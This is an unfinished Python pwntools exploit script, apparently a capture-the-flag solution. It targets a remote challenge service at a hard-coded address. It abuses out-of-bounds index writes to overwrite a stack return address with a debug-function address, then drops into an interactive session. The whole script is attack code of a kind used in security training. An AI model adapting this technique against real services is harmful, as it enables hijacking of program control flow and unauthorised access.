# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

# not yet completed

from pwn import *

context.arch = "amd64"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = False

host = "104.199.235.135"
port = 2112
if is_local:
    host = "127.0.0.1"
    port = 8888
r = remote(host, port)

def select_parasite(idx, value, is_end = 0):
    r.recvuntil(": ")
    r.sendline(str(idx))
    r.recvuntil(": ")
    r.sendline(str(value))
    r.recv()
    r.sendline(str(is_end))

def calc_idx_1(new_address):
    return int((new_address - 0x7fffffffd940) / 0x08)
# e.g. long long int = 8 bytes
# 0x7fffffffd938 = 1602
# 0x7fffffffd940 = 0, idx = 0
# 0x7fffffffd948 = 0

def calc_idx_2(new_address):
    return str(int((new_address - 0x7fffffffd990) / 0x10))
# e.g. char = 1 byte
# &franxx[3] = 0x7fffffffd9c0 Genista
# &franxx[4] = 0x7fffffffd9d0 Chlorophytum
# &franxx[?] = 0x7fffffffda78 = &return-address

input("Attach in gdb and press Enter")

select_parasite(0, 2)
select_parasite(1, 16)
select_parasite(-1, 6666, 1)

debug_address = 0x000000004007d6

#0x7ffff7a47624 <__call_tls_dtors+100>      ret             <0x7ffff7a46f27; __run_exit_handlers+23>
#00:0000│ rsp  0x7fffffffd8d8 —▸ 0x7ffff7a46f27 (__run_exit_handlers+23) ◂— mov    r13, qword ptr [rbp]

r.recvuntil("? ")
r.sendline(calc_idx_2(0x7fffffffd910))
r.recvuntil(": ")

payload = flat(["A" * 8, debug_address])
log.info("payload: " + str(payload))
r.sendline(payload)

r.interactive("Pwned # ")

